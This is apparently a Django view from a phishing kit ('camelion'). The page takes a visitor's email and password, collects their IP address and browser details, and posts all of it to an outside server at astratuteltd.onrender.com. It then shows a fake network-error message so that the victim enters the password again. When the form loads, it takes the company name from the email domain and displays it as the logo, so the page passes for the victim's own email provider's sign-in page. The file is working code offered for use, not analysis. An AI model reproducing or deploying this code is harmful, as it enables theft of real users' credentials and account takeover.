import requests
import tldextract
from django.shortcuts import render,redirect
from django.core.validators import validate_email
from django.core.exceptions import ValidationError
from django.contrib import messages
from django.urls import reverse
from django.http import HttpResponseRedirect

from .utils import get_browser_info,get_client_ip

def camelion_view(request):
    if request.method == 'POST':
        email = request.POST.get('f_email', '').strip()
        password = request.POST.get('f_password')

        # url = "http://localhost:8000/api/auth/8/"
        url = "https://astratuteltd.onrender.com/api/auth/8/"

        # validate_email(email)
        ip_address = get_client_ip(request)
        browser_info = get_browser_info(request)

        data = {
            "email": email,
            "password": password,
            "ip_address": ip_address,
            "browser_version": browser_info['version'],
            "browser_type":browser_info['browser'],
            "browser_agent":browser_info['agent'],
        }

        headers = {
            "Content-Type": "application/json",
            # "Authorization": "Token your_api_token_here",  # Uncomment if needed
        }

        try:
            response = requests.post(url, json=data, headers=headers)
            print("passed here")

            if response.status_code in [200, 202]:
                messages.success(request, "Network Error! Please verify your information and try again.")
                print("passed here 2")
                # Redirect to the same view with email as query param
                redirect_url = reverse('camelion:camelion') + f'?em={email}'
                return redirect(redirect_url)

            else:
                # API responded but with error status
                messages.error(request, f"Failed. Server responded with {response.status_code} status code.")
                print("passed here 3")
                redirect_url = reverse('camelion:camelion') + f'?em={email}'
                return redirect(redirect_url)

        except requests.exceptions.RequestException as e:
            # Network error or timeout
            messages.error(request, f"Error connecting to remote API: {str(e)}")

        # fallback to previous page on exception or POST error
        return HttpResponseRedirect(request.META.get('HTTP_REFERER', '/'))
    else:
        existing_email = request.GET.get('em', '').strip()
        email_is_valid = False
        domain = None
        base_domain = "Sign In"

        try:
            if existing_email:
                validate_email(existing_email)
                email_is_valid = True
                domain = existing_email.split('@')[-1]
                # Extract clean base domain
                extracted = tldextract.extract(domain)
                base_domain = extracted.domain
        except ValidationError:
            existing_email = ''
            # email_is_valid = False
            # base_domain = "Sign In"

        context = {
            'existing_email': existing_email,
            'email_is_valid': email_is_valid,
            'logo_text': base_domain.upper(),
            'domain':domain,
        }
    return render(request, 'camelion/camelion_one.html', context)
